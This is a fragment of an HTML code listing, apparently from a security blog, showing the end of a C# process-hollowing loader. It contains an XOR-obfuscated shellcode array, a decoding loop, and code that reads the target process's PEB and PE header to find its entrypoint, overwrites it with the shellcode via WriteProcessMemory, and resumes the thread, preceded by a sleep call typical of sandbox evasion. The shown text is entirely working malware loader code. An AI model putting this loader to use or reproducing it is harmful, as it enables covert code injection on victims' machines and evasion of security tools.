            <span class="m">0xfc</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xa8</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xb0</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span>
            <span class="m">0xc0</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0xfd</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x1a</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0x9a</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x70</span><span class="p">,</span>
            <span class="m">0x3b</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xdc</span><span class="p">,</span><span class="m">0xef</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0xe7</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf9</span><span class="p">,</span><span class="m">0xbe</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span>
            <span class="m">0x46</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x70</span><span class="p">,</span><span class="m">0xfa</span><span class="p">,</span><span class="m">0x81</span><span class="p">,</span><span class="m">0x9a</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0x7f</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0x3d</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span>
            <span class="m">0x08</span><span class="p">,</span><span class="m">0x15</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x23</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0xa0</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">};</span>
      
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
            <span class="p">{</span>
                <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="kt">uint</span> <span class="n">retLength</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
            <span class="n">IntPtr</span> <span class="n">procHandle</span> <span class="p">=</span> <span class="n">proc_info</span><span class="p">.</span><span class="n">hProcess</span><span class="p">;</span>
            <span class="n">IntPtr</span> <span class="n">threadHandle</span> <span class="p">=</span> <span class="n">proc_info</span><span class="p">.</span><span class="n">hThread</span><span class="p">;</span>
            <span class="nf">ZwQueryInformationProcess</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">PROCESSBASICINFORMATION</span><span class="p">,</span> <span class="k">ref</span> <span class="n">pbi</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span> <span class="p">*</span> <span class="m">6</span><span class="p">),</span> <span class="k">ref</span> <span class="n">retLength</span><span class="p">);</span>
            <span class="n">IntPtr</span> <span class="n">imageBaseAddr</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)((</span><span class="n">Int64</span><span class="p">)</span><span class="n">pbi</span><span class="p">.</span><span class="n">PebAddress</span> <span class="p">+</span> <span class="m">0x10</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Image Base Address found: 0x{0}"</span><span class="p">,</span> <span class="n">imageBaseAddr</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"x"</span><span class="p">));</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">baseAddrBytes</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">0x8</span><span class="p">];</span>
            <span class="n">IntPtr</span> <span class="n">lpNumberofBytesRead</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
            <span class="nf">ReadProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">imageBaseAddr</span><span class="p">,</span> <span class="n">baseAddrBytes</span><span class="p">,</span> <span class="n">baseAddrBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpNumberofBytesRead</span><span class="p">);</span>
            <span class="n">IntPtr</span> <span class="n">execAddr</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">(</span><span class="n">baseAddrBytes</span><span class="p">,</span> <span class="m">0</span><span class="p">));</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">0x200</span><span class="p">];</span>
            <span class="nf">ReadProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">execAddr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpNumberofBytesRead</span><span class="p">);</span>
            <span class="kt">uint</span> <span class="n">e_lfanew</span> <span class="p">=</span> <span class="n">BitConverter</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="m">0x3C</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] e_lfanew: 0x{0}"</span><span class="p">,</span> <span class="n">e_lfanew</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"X"</span><span class="p">));</span>
            <span class="kt">uint</span> <span class="n">rvaOffset</span> <span class="p">=</span> <span class="n">e_lfanew</span> <span class="p">+</span> <span class="m">0x28</span><span class="p">;</span>
            <span class="kt">uint</span> <span class="n">rva</span> <span class="p">=</span> <span class="n">BitConverter</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">rvaOffset</span><span class="p">);</span>
            <span class="n">IntPtr</span> <span class="n">entrypointAddr</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)((</span><span class="n">UInt64</span><span class="p">)</span><span class="n">execAddr</span> <span class="p">+</span> <span class="n">rva</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Entrypoint Found: 0x{0}"</span><span class="p">,</span> <span class="n">entrypointAddr</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"X"</span><span class="p">));</span>
            <span class="n">IntPtr</span> <span class="n">lpNumberOfBytesWritten</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
            <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">entrypointAddr</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">ref</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Memory written. Resuming thread..."</span><span class="p">);</span>
            <span class="nf">ResumeThread</span><span class="p">(</span><span class="n">threadHandle</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nf">sleep</span><span class="p">();</span>
            <span class="nf">Hollow</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
